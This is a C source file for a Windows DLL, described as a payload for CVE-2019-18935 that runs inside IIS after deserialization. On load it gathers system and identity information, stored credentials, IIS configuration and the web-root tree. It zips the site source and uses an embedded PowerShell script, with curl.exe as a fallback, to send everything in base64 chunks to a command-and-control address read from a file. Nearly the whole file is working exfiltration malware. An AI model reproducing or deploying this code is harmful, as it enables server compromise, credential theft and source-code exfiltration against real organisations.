#include <windows.h>
#include <stdio.h>

/*
 * exfil.c — CVE-2019-18935 payload: harvest + outbound exfil.
 *
 * Runs as the IIS app-pool identity after deserialization. Does not depend on a
 * writable web-served directory (writemap showed all of wwwroot is denied).
 *
 * Receiver base URL is read at runtime from C:\Windows\Temp\c2.txt so it can be
 * changed without a rebuild.
 *
 * Beacons FIRST, before doing any work, so a run tells us immediately whether
 * the payload executed and whether egress works:
 *   /hello      id + identity
 *   /f-<name>   base64 of each small text artifact
 *   /manifest   name=...&size=...&sha=...&chunks=...
 *   /c<i>       base64 chunk i
 *   /done       "ok"
 *
 * TLS 1.2/1.3 is forced: PowerShell on older servers defaults to TLS 1.0, which
 * modern receivers reject. curl.exe is used as a fallback transport.
 */

static const char *PS_SCRIPT =
    "$ErrorActionPreference='SilentlyContinue'\n"
    "try{[Net.ServicePointManager]::SecurityProtocol="
    "[Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11"
    " -bor [Net.SecurityProtocolType]::Tls13}catch{}\n"
    "$tmp='C:\\Windows\\Temp'\n"
    "$cfg=Join-Path $tmp 'c2.txt'\n"
    "if(!(Test-Path $cfg)){exit}\n"
    "$base=(Get-Content $cfg -TotalCount 1).Trim()\n"
    "if(!$base){exit}\n"
    "function Post($p,$b,$ct){\n"
    " $tf=Join-Path $tmp 'body.tmp'\n"
    " [IO.File]::WriteAllText($tf,$b)\n"
    " try{Invoke-WebRequest -Uri \"$base/$p\" -Method Post -InFile $tf "
    "-ContentType $ct -UseBasicParsing -TimeoutSec 40|Out-Null;return $true}catch{}\n"
    " try{& curl.exe -s -m 40 -H \"Content-Type: $ct\" "
    "--data-binary \"@$tf\" \"$base/$p\"|Out-Null;"
    "if($LASTEXITCODE -eq 0){return $true}}catch{}\n"
    " return $false\n"
    "}\n"
    "$id=\"$env:COMPUTERNAME-$PID\"\n"
    "Post 'hello' \"id=$id user=$([Environment]::UserName) host=$env:COMPUTERNAME\" 'text/plain'\n"
    "foreach($f in @('whoami','env','ipconfig','apphost','creds','admins','tree')){\n"
    " $p=Join-Path $tmp \"$f.txt\"\n"
    " if(Test-Path $p){ Post \"f-$f\" ([Convert]::ToBase64String([IO.File]::ReadAllBytes($p))) 'text/plain' }\n"
    "}\n"
    "$zip=Join-Path $tmp 'src.zip'\n"
    "if(Test-Path $zip){\n"
    " $b=[IO.File]::ReadAllBytes($zip)\n"
    " $b64=[Convert]::ToBase64String($b)\n"
    " $sha=(Get-FileHash $zip -Algorithm SHA256).Hash\n"
    " $n=[int][math]::Ceiling($b64.Length/48000)\n"
    " Post 'manifest' \"name=src.zip&size=$($b.Length)&sha=$sha&chunks=$n\" 'text/plain'\n"
    " for($i=0;$i -lt $n;$i++){\n"
    "  $s=$i*48000\n"
    "  $len=[math]::Min(48000,$b64.Length-$s)\n"
    "  Post \"c$i\" $b64.Substring($s,$len) 'text/plain'\n"
    " }\n"
    "}\n"
    "Post 'done' 'ok' 'text/plain'\n";

static void run(const char *cmd)
{
    system(cmd);
}

static DWORD WINAPI Worker(LPVOID lpParam)
{
    (void)lpParam;

    // Let the deserialization request unwind first.
    Sleep(300);

    // ---- 1. local recon artifacts -------------------------------------
    run("cmd /c whoami /all > C:\\Windows\\Temp\\whoami.txt 2>&1");
    run("cmd /c set > C:\\Windows\\Temp\\env.txt 2>&1");
    run("cmd /c ipconfig /all > C:\\Windows\\Temp\\ipconfig.txt 2>&1");
    run("cmd /c net localgroup administrators > C:\\Windows\\Temp\\admins.txt 2>&1");
    run("cmd /c cmdkey /list > C:\\Windows\\Temp\\creds.txt 2>&1");
    run("cmd /c dir /s /b C:\\inetpub\\wwwroot > C:\\Windows\\Temp\\tree.txt 2>&1");
    run("cmd /c type C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config "
        "> C:\\Windows\\Temp\\apphost.config 2>&1");

    // ---- 2. zip the web root ------------------------------------------
    const char *roots[] = {
        "C:\\inetpub\\wwwroot",
        "C:\\inetpub\\wwwroot\\StartUp",
        "C:\\inetpub\\vhosts",
        NULL
    };
    for (int i = 0; roots[i]; i++) {
        char cmd[1024];
        snprintf(cmd, sizeof(cmd),
            "powershell -NoProfile -ExecutionPolicy Bypass -Command \""
            "try { Compress-Archive -Path '%s\\*' "
            "-DestinationPath 'C:\\Windows\\Temp\\src.zip' -Force -ErrorAction Stop }"
            " catch { exit 1 }\"", roots[i]);
        run(cmd);
        FILE *f = fopen("C:\\Windows\\Temp\\src.zip", "rb");
        if (f) {
            long sz = 0;
            fseek(f, 0, SEEK_END);
            sz = ftell(f);
            fclose(f);
            if (sz > 1000) break;
            remove("C:\\Windows\\Temp\\src.zip");
        }
    }

    // ---- 3. ship it ----------------------------------------------------
    FILE *f = fopen("C:\\Windows\\Temp\\exfil.ps1", "wb");
    if (f) {
        fputs(PS_SCRIPT, f);
        fclose(f);
        run("powershell -NoProfile -ExecutionPolicy Bypass "
            "-File C:\\Windows\\Temp\\exfil.ps1");
    }

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
    HANDLE hThread;
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        hThread = CreateThread(0, 0, Worker, 0, 0, 0);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
